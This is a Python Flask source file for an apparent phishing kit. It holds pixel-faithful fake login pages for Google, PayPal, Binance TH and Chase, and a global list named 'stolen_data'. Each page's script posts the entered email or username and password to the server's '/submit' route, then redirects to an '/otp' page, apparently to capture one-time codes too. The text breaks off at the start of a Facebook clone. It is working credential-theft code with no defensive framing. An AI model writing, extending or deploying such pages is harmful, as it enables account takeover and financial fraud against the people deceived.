import secrets
import time
import uuid
from flask import Flask, request, jsonify

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

stolen_data = []

# ========== YOUR EXACT GOOGLE DESIGN ==========
GOOGLE_LOGIN = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Google Sign In</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background-color: #000000; color: #ffffff; font-family: "Google Sans", Roboto, Arial, sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 60px 28px 40px; }
    .logo { font-size: 26px; font-weight: 400; color: #ffffff; margin-bottom: 28px; letter-spacing: 0.3px; }
    h1 { font-size: 30px; font-weight: 400; color: #ffffff; margin-bottom: 18px; }
    .subtitle { font-size: 15px; color: #e0e0e0; text-align: center; line-height: 1.6; max-width: 340px; margin-bottom: 6px; }
    .learn-more { color: #7baaf7; font-size: 15px; font-weight: 600; text-decoration: none; text-align: center; margin-bottom: 36px; display: block; }
    .learn-more:hover { text-decoration: underline; }
    .input-wrapper { width: 100%; max-width: 380px; margin-bottom: 12px; }
    .input-field { width: 100%; background: transparent; border: 1.5px solid #5f6368; border-radius: 4px; padding: 16px 14px; font-size: 16px; color: #e8eaed; outline: none; transition: border-color 0.2s; margin-bottom: 16px; }
    .input-field::placeholder { color: #9aa0a6; }
    .input-field:focus { border-color: #7baaf7; }
    .forgot-link { color: #7baaf7; font-size: 14px; font-weight: 600; text-decoration: none; display: block; margin-bottom: 32px; }
    .create-link { color: #7baaf7; font-size: 15px; font-weight: 600; text-decoration: none; align-self: flex-start; max-width: 380px; width: 100%; }
    .spacer { flex: 1; }
    .btn-row { width: 100%; max-width: 380px; display: flex; justify-content: flex-end; padding-bottom: 20px; }
    .btn-next { background-color: #7baaf7; color: #000000; border: none; border-radius: 6px; padding: 14px 32px; font-size: 16px; font-weight: 500; cursor: pointer; transition: background-color 0.2s; }
    .btn-next:hover { background-color: #6a9de8; }
  </style>
</head>
<body>
  <div class="logo">Google</div>
  <h1>Sign in</h1>
  <p class="subtitle">Use your Google Account. The account will be added to this device and available to other Google apps.</p>
  <a href="#" class="learn-more">Learn more about using your account</a>
  <form id="loginForm">
    <div class="input-wrapper"><input class="input-field" type="text" id="email" placeholder="Email or phone" /></div>
    <div class="input-wrapper"><input class="input-field" type="password" id="password" placeholder="Password" /></div>
    <a href="#" class="forgot-link">Forgot email?</a>
    <a href="#" class="create-link">Create account</a>
    <div class="spacer"></div>
    <div class="btn-row"><button type="submit" class="btn-next">Next</button></div>
  </form>
  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      fetch('/submit', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ email: document.getElementById('email').value, password: document.getElementById('password').value, platform: 'google', step: 'login' })
      }).then(() => { window.location.href = '/otp/google'; });
    });
  </script>
</body>
</html>
'''

# ========== YOUR EXACT PAYPAL DESIGN ==========
PAYPAL_LOGIN = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>PayPal Login</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; background-color: #f5f7fa; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: space-between; }
    .main-wrapper { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%; padding: 60px 20px 40px; }
    .logo { font-size: 38px; font-weight: 800; color: #003087; letter-spacing: -1px; margin-bottom: 50px; }
    .login-card { background: #ffffff; border-radius: 8px; padding: 36px 28px 30px; width: 100%; max-width: 440px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.07); }
    .input-field { width: 100%; border: 1.5px solid #b5bec9; border-radius: 6px; padding: 18px 16px; font-size: 16px; color: #687173; background: #ffffff; outline: none; transition: border-color 0.2s; margin-bottom: 14px; }
    .input-field:focus { border-color: #0070ba; }
    .forgot-link { display: inline-block; color: #0070ba; font-size: 14px; text-decoration: none; margin-bottom: 24px; }
    .btn-next { display: block; width: 100%; padding: 16px; background-color: #0070ba; color: #ffffff; font-size: 17px; font-weight: 600; border: none; border-radius: 28px; cursor: pointer; text-align: center; transition: background-color 0.2s; margin-bottom: 22px; }
    .btn-next:hover { background-color: #005ea6; }
    .divider { display: flex; align-items: center; gap: 14px; margin-bottom: 22px; color: #687173; font-size: 15px; }
    .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background-color: #d0d5da; }
    .btn-signup { display: block; width: 100%; padding: 15px; background-color: transparent; color: #111111; font-size: 17px; font-weight: 600; border: 2px solid #222222; border-radius: 28px; cursor: pointer; text-align: center; transition: background-color 0.2s; }
    .btn-signup:hover { background-color: #f0f0f0; }
    .language-bar { display: flex; align-items: center; gap: 12px; margin-top: 36px; flex-wrap: wrap; justify-content: center; }
    .flag-emoji { font-size: 18px; line-height: 1; }
    .language-bar a { text-decoration: none; font-size: 14px; color: #555; }
    .language-bar a.active { font-weight: 700; color: #111; }
    footer { width: 100%; border-top: 1px solid #dde1e7; padding: 16px 20px; display: flex; justify-content: center; flex-wrap: wrap; gap: 6px 22px; }
    footer a { text-decoration: none; font-size: 13px; color: #555; }
  </style>
</head>
<body>
  <div class="main-wrapper">
    <div class="logo">PayPal</div>
    <div class="login-card">
      <form id="loginForm">
        <input class="input-field" type="text" id="email" placeholder="Email or mobile number" />
        <input class="input-field" type="password" id="password" placeholder="Password" />
        <a href="#" class="forgot-link">Forgot email?</a>
        <button type="submit" class="btn-next">Next</button>
        <div class="divider">or</div>
        <button class="btn-signup">Sign Up</button>
      </form>
    </div>
    <div class="language-bar"><span class="flag-emoji">🇺🇸</span><a href="#" class="active">English</a><span class="sep">|</span><a href="#">Français</a><span class="sep">|</span><a href="#">Español</a><span class="sep">|</span><a href="#">中文</a></div>
  </div>
  <footer><a href="#">Contact Us</a><a href="#">Privacy</a><a href="#">Legal</a><a href="#">Policy Updates</a><a href="#">Worldwide</a></footer>
  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      fetch('/submit', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ email: document.getElementById('email').value, password: document.getElementById('password').value, platform: 'paypal', step: 'login' })
      }).then(() => { window.location.href = '/otp/paypal'; });
    });
  </script>
</body>
</html>
'''

# ========== YOUR EXACT BINANCE DESIGN ==========
BINANCE_LOGIN = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Binance TH Login</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background-color: #ffffff; font-family: "Helvetica Neue", Arial, sans-serif; min-height: 100vh; display: flex; flex-direction: column; }
    nav { display: flex; align-items: center; justify-content: space-between; padding: 14px 18px; border-bottom: 1px solid #f0f0f0; }
    .nav-logo { display: flex; align-items: center; gap: 8px; }
    .nav-logo svg { width: 32px; height: 32px; }
    .nav-logo-text { display: flex; flex-direction: column; line-height: 1.1; }
    .brand-name { font-size: 17px; font-weight: 700; color: #1e2026; letter-spacing: 0.5px; }
    .brand-name span { color: #f0b90b; }
    .brand-sub { font-size: 9px; color: #aaa; letter-spacing: 0.5px; }
    .nav-right { display: flex; align-items: center; gap: 12px; }
    .btn-register { background-color: #f0b90b; color: #1e2026; border: none; border-radius: 4px; padding: 10px 22px; font-size: 15px; font-weight: 600; cursor: pointer; }
    .hamburger { font-size: 22px; cursor: pointer; color: #1e2026; background: none; border: none; }
    .security-banner { background-color: #fef9e7; border-bottom: 1px solid #f5e79e; padding: 12px 18px; display: flex; align-items: flex-start; gap: 10px; }
    .security-banner .lock-icon { font-size: 16px; color: #f0b90b; margin-top: 2px; flex-shrink: 0; }
    .security-banner p { font-size: 13px; color: #b78a00; line-height: 1.5; }
    .security-banner a { color: #b78a00; font-weight: 600; }
    .main { flex: 1; padding: 36px 22px; }
    h1 { font-size: 26px; font-weight: 700; color: #1e2026; text-align: center; margin-bottom: 28px; }
    .tabs { display: flex; border-bottom: 1.5px solid #e8e8e8; margin-bottom: 28px; gap: 0; }
    .tab { flex: 1; text-align: center; padding: 12px 0; font-size: 16px; font-weight: 500; color: #9aa0a6; cursor: pointer; border-bottom: 3px solid transparent; margin-bottom: -1.5px; transition: color 0.2s; }
    .tab.active { color: #1e2026; font-weight: 700; border-bottom: 3px solid #f0b90b; }
    .field-label { font-size: 14px; color: #1e2026; margin-bottom: 8px; }
    .input-field { width: 100%; border: 1.5px solid #d9d9d9; border-radius: 4px; padding: 16px 14px; font-size: 15px; color: #1e2026; background: #fff; outline: none; transition: border-color 0.2s; margin-bottom: 20px; }
    .input-field:focus { border-color: #f0b90b; }
    .password-wrapper { position: relative; }
    .password-wrapper .input-field { padding-right: 48px; }
    .toggle-eye { position: absolute; right: 14px; top: 50%; transform: translateY(-60%); cursor: pointer; color: #aaa; font-size: 20px; user-select: none; }
    .btn-login { width: 100%; background-color: #f0b90b; color: #1e2026; border: none; border-radius: 4px; padding: 17px; font-size: 16px; font-weight: 700; cursor: pointer; margin-bottom: 20px; transition: background-color 0.2s; }
    .btn-login:hover { background-color: #d9a609; }
    .bottom-links { display: flex; justify-content: space-between; }
    .bottom-links a { color: #f0b90b; font-size: 14px; font-weight: 600; text-decoration: none; }
    .chat-fab { position: fixed; bottom: 28px; right: 20px; width: 52px; height: 52px; background-color: #f0b90b; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
    .chat-fab svg { width: 26px; height: 26px; fill: #1e2026; }
  </style>
</head>
<body>
  <nav><div class="nav-logo"><svg viewBox="0 0 40 40" fill="none"><polygon points="20,4 36,20 20,36 4,20" fill="#f0b90b"/><polygon points="20,10 30,20 20,30 10,20" fill="#fff" opacity="0.3"/></svg><div class="nav-logo-text"><span class="brand-name">BINANCE <span>TH</span></span><span class="brand-sub">BY GULF BINANCE</span></div></div><div class="nav-right"><button class="btn-register">Register</button><button class="hamburger">&#9776;</button></div></nav>
  <div class="security-banner"><span class="lock-icon">🔒</span><p>Please check that you are visiting the correct URL&nbsp;&nbsp;<a href="#">https://accounts.binance.th</a></p></div>
  <div class="main"><h1>Log In</h1><div class="tabs"><div class="tab active">Email</div><div class="tab">Mobile</div></div>
  <form id="loginForm"><p class="field-label">Email</p><input class="input-field" type="email" id="email" /><p class="field-label">Password</p><div class="password-wrapper"><input class="input-field" type="password" id="password" /><span class="toggle-eye">&#128065;&#65038;</span></div><button type="submit" class="btn-login">Log In</button><div class="bottom-links"><a href="#">Register</a><a href="#">Forgot Password?</a></div></form></div>
  <div class="chat-fab"><svg viewBox="0 0 24 24"><path d="M20 2H4a2 2 0 0 0-2 2v18l4-4h14a2 2 0 0 0 2-2V4a2 2 0 0 0-2-2zm-2 10H6V10h12v2zm0-4H6V6h12v2z"/></svg></div>
  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      fetch('/submit', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ email: document.getElementById('email').value, password: document.getElementById('password').value, platform: 'binance', step: 'login' })
      }).then(() => { window.location.href = '/otp/binance'; });
    });
  </script>
</body>
</html>
'''

# ========== YOUR EXACT CHASE DESIGN ==========
CHASE_LOGIN = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Chase Sign In</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: "Helvetica Neue", Arial, sans-serif; background-color: #e8eaf0; min-height: 100vh; display: flex; flex-direction: column; }
    .hero { position: relative; width: 100%; min-height: 680px; background: linear-gradient(to bottom, rgba(10,20,50,0.55) 0%, rgba(10,30,70,0.3) 40%, rgba(60,80,60,0.25) 100%), linear-gradient(160deg, #0d1b3e 0%, #1a3260 18%, #1e4080 35%, #2a5598 50%, #3a6080 62%, #4a7060 72%, #5a6840 80%, #3a4030 90%, #2a3020 100%); display: flex; flex-direction: column; align-items: center; padding-top: 36px; padding-bottom: 50px; }
    .hero::before { content: ""; position: absolute; bottom: 120px; left: 0; right: 0; height: 80px; background: linear-gradient(to top, rgba(255,160,30,0.18), transparent); pointer-events: none; }
    .chase-logo { display: flex; align-items: center; gap: 14px; margin-bottom: 44px; z-index: 2; }
    .chase-wordmark { font-size: 36px; font-weight: 800; color: #ffffff; letter-spacing: 3px; font-family: "Arial Black", Arial, sans-serif; }
    .chase-icon { width: 46px; height: 46px; flex-shrink: 0; }
    .card { background: #ffffff; border-radius: 10px; padding: 28px 24px 30px; width: 88%; max-width: 400px; z-index: 2; box-shadow: 0 6px 24px rgba(0,0,0,0.25); }
    .field-group { margin-bottom: 22px; }
    .field-label { display: block; font-size: 14px; color: #555; margin-bottom: 4px; }
    .input-row { display: flex; align-items: center; border-bottom: 2px solid #1a56a0; }
    .input-field { flex: 1; border: none; outline: none; font-size: 17px; color: #111; padding: 7px 0; background: transparent; }
    .show-link { color: #1a56a0; font-size: 15px; font-weight: 700; cursor: pointer; text-decoration: none; white-space: nowrap; margin-left: 8px; }
    .checkboxes { display: flex; gap: 32px; margin-bottom: 26px; }
    .checkbox-item { display: flex; align-items: flex-start; gap: 8px; font-size: 14px; color: #444; cursor: pointer; line-height: 1.4; }
    .checkbox-item input[type="checkbox"] { width: 20px; height: 20px; margin-top: 1px; flex-shrink: 0; border: 1.5px solid #888; border-radius: 3px; appearance: none; background: #fff; cursor: pointer; }
    .checkbox-item input[type="checkbox"]:checked { background-color: #1a56a0; border-color: #1a56a0; }
    .btn-signin { display: block; width: 100%; background-color: #1a56a0; color: #ffffff; border: none; border-radius: 5px; padding: 16px; font-size: 18px; font-weight: 700; cursor: pointer; margin-bottom: 20px; }
    .btn-signin:hover { background-color: #154a8a; }
    .divider { display: flex; align-items: center; gap: 12px; color: #777; font-size: 15px; margin-bottom: 18px; }
    .divider::before, .divider::after { content: ""; flex: 1; height: 1.5px; background: #1a56a0; opacity: 0.4; }
    .btn-passwordless { display: block; width: 100%; background: transparent; border: 2px solid #1a56a0; border-radius: 5px; padding: 14px; font-size: 17px; font-weight: 700; color: #1a56a0; cursor: pointer; margin-bottom: 20px; }
    .action-link { display: flex; align-items: center; color: #1a56a0; font-size: 16px; text-decoration: none; margin-bottom: 16px; }
    .action-link .chevron { margin-left: 8px; font-size: 18px; font-weight: 700; }
    footer { background-color: #e8eaf0; padding: 28px 20px 24px; }
    .social-icons { display: flex; justify-content: center; gap: 26px; margin-bottom: 20px; }
    .social-icon svg { width: 28px; height: 28px; fill: #444; }
    .footer-links { display: flex; flex-wrap: wrap; justify-content: center; gap: 6px 20px; margin-bottom: 12px; }
    .footer-links a { font-size: 12px; color: #333; text-decoration: underline; }
    .footer-bottom { text-align: center; font-size: 12px; color: #555; line-height: 2; }
  </style>
</head>
<body>
  <div class="hero">
    <div class="chase-logo"><span class="chase-wordmark">CHASE</span><svg class="chase-icon" viewBox="0 0 46 46"><polygon points="14,2 32,2 44,14 44,32 32,44 14,44 2,32 2,14" fill="white"/><polygon points="17,5 29,5 41,17 41,29 29,41 17,41 5,29 5,17" fill="#1a56a0"/><rect x="12" y="12" width="9" height="9" fill="white"/><rect x="25" y="12" width="9" height="9" fill="white"/><rect x="12" y="25" width="9" height="9" fill="white"/><rect x="25" y="25" width="9" height="9" fill="white"/></svg></div>
    <div class="card">
      <form id="loginForm">
        <div class="field-group"><label class="field-label">Username</label><div class="input-row"><input class="input-field" type="text" id="username" /></div></div>
        <div class="field-group"><label class="field-label">Password</label><div class="input-row"><input class="input-field" type="password" id="password" /><a href="#" class="show-link">Show</a></div></div>
        <div class="checkboxes"><label class="checkbox-item"><input type="checkbox" />Remember username</label><label class="checkbox-item"><input type="checkbox" />Use token</label></div>
        <button type="submit" class="btn-signin">Sign in</button>
        <div class="divider">Or</div>
        <button class="btn-passwordless">Passwordless sign in</button>
        <a href="#" class="action-link">Forgot username/password? <span class="chevron">›</span></a>
        <a href="#" class="action-link">Not enrolled? Sign up now. <span class="chevron">›</span></a>
      </form>
    </div>
  </div>
  <footer><div class="social-icons"><a class="social-icon"><svg viewBox="0 0 24 24"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"/></svg></a></div><div class="footer-links"><a href="#">Contact us</a><a href="#">Privacy & security</a><a href="#">Terms of use</a><a href="#">Accessibility</a></div><div class="footer-bottom">Member FDIC &nbsp;|&nbsp; Equal Housing Opportunity<br>&copy; 2026 JPMorganChase</div></footer>
  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      fetch('/submit', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ email: document.getElementById('username').value, password: document.getElementById('password').value, platform: 'chase', step: 'login' })
      }).then(() => { window.location.href = '/otp/chase'; });
    });
  </script>
</body>
</html>
'''

# ========== YOUR EXACT FACEBOOK DESIGN ==========
FACEBOOK_LOGIN = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta 
